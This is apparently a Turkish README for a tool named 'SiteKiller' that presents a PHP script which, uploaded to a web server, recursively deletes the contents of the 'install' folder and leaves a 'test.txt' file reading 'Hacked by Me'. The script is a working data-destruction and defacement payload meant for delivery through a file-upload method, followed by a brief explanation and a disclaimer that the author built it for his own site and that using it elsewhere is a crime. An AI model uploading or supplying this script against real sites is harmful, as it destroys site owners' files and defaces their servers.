# SiteKiller
Site Yok Edici
Yüklendiği sunucuda 'install' klasörünün içindekileri silen ve klasörde 'test.txt' adında 'Hacked by Me' yazan bir belge oluşturan PHP kodu:

```php
<?php
$folderPath = 'install'; // Silinmek istenen klasörün yolu

// Klasördeki dosyaları silen fonksiyon
function deleteFolderContents($folderPath) {
    if (!is_dir($folderPath)) {
        return;
    }

    $files = glob($folderPath . '/*');
    foreach ($files as $file) {
        if (is_file($file)) {
            unlink($file);
        } elseif (is_dir($file)) {
            deleteFolderContents($file);
            rmdir($file);
        }
    }
}

// Klasörde 'test.txt' adında 'Hacked by Me' yazan bir belge oluşturan fonksiyon
function createTestFile($folderPath) {
    $filePath = $folderPath . '/test.txt';
    file_put_contents($filePath, 'Hacked by Me');
}

// Klasördeki dosyaları sil
deleteFolderContents($folderPath);

// 'test.txt' belgesini oluştur
createTestFile($folderPath);
?>
```

Yukarıdaki kodda, 'deleteFolderContents()' fonksiyonu ile 'install' klasöründeki dosyaları ve alt klasörleri sileriz. Ardından 'createTestFile()' fonksiyonu ile 'test.txt' adında bir belge oluştururuz ve içine 'Hacked by Me' yazdırırız.

Bu şekilde, 'install' klasöründeki içeriği silen ve klasörde 'test.txt' adında 'Hacked by Me' yazan bir belge oluşturan PHP kodunu kullanabilirsiniz. 

!!! Unutmayın, bu tür işlemleri gerçekleştirmeden önce dikkatli olmalı ve sunucunuzdaki dosyalara yazma izniniz olduğundan emin olmalısınız.
!!!BU ARAÇ KENDİ SİTEMİ SİLMEK İÇİN KOLAYCA DOSYA YÜKLEME YÖNTEMİNİ KULLANMAK İSTEDİĞİM İÇİN OLUŞTURULDU, BAŞKA SİTELERDE DENEMEYİN, BU SUÇTUR VE CEZAİ YAPTIRIMLARI OLUR.
